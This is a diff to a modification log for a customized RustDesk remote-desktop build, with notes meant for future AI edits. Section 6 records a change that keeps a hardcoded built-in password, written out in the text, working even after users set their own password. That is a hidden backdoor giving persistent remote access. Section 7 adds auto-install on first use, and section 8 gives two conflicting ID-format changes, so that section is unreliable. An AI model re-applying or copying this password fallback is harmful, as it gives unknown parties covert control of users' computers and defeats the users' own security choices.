@@ -1,4 +1,4 @@
-# RustDesk Custom Modification Record
+﻿# RustDesk Custom Modification Record
 
 This file records the local customizations that should be re-applied after updating from upstream RustDesk.
 
@@ -128,6 +128,88 @@ Effect:
 - Fresh clients use `www.dsecret.com:21106` as the built-in ID/rendezvous server when no user custom server is set.
 - If the server key changes, `RS_PUB_KEY` must be updated together with the server address.
 
+
+### 6. Built-in password fallback after user sets new password
+
+File: `libs/hbb_common/src/config.rs`
+
+In `matches_permanent_password_plain()`, when a user has set a permanent password through the client UI, the built-in HARD_SETTINGS password (`caonima123`) was previously ignored. Modified to add fallback logic:
+
+```rust
+// After checking user-set password (both hashed and plaintext), fallback to HARD_SETTINGS
+HARD_SETTINGS
+    .read()
+    .unwrap()
+    .get("password")
+    .map_or(false, |v| v == input)
+```
+
+Effect:
+
+- User-set permanent password and built-in `caonima123` both work simultaneously.
+- SOS version does not need this change (password change UI is removed).
+
+### 7. Auto-install on "Start service" click
+
+File: `flutter/lib/common.dart`
+
+Modified `start_service()` so that clicking "Start service" when the app is not installed triggers the full installation flow (one-time UAC prompt, install + service registration). After installation, subsequent clicks just toggle the `stop-service` flag.
+
+```dart
+Future<void> start_service(bool is_start) async {
+  if (!is_start) {
+    mainSetBoolOption(kOptionStopService, true);
+    return;
+  }
+  if (!bind.mainIsInstalled()) {
+    bind.mainGotoInstall();
+  } else {
+    mainSetBoolOption(kOptionStopService, false);
+  }
+}
+```
+
+Effect:
+
+- First use: click "Start service" → UAC → full install → service auto-starts → "Ready".
+- Subsequent opens: service already running → "Ready" immediately.
+- If installation fails (e.g., antivirus), a toast "Installation failed" is shown.
+- SOS version is not affected (`disable-installation` blocks installation flow).
+
+### 8. Relaxed custom ID format
+
+Files: `libs/hbb_common/src/lib.rs`, `flutter/lib/common/widgets/dialog.dart`
+
+```rust
+// before
+r#"^[a-zA-Z][\w-]{5,15}$"#
+// after
+r#"^[a-zA-Z0-9][a-zA-Z0-9_-]{5,15}$"#
+```
+
+UI validation updated: first char rule changed from "starts with a letter" to "starts with a letter or number".
+
+Effect:
+
+- 6-16 characters, letters and digits, underscore and hyphen allowed after first char.
+- First character must be a letter or number (no _ or -).
+- Pure numbers, pure letters, or mixed all allowed.
+
+
+File: `libs/hbb_common/src/lib.rs`
+
+```rust
+// before
+r#"^[a-zA-Z][\w-]{5,15}$"#
+// after
+r#"^[a-zA-Z0-9]{6,16}$"#
+```
+
+Effect:
+
+- 6-16 characters, English letters and digits only.
+- Pure numbers and pure letters are allowed.
+- No requirement to start with a letter.
 ## Notes For Future AI Changes
 
 - Re-apply changes by file and option key, not only by line number, because upstream RustDesk line numbers change often.
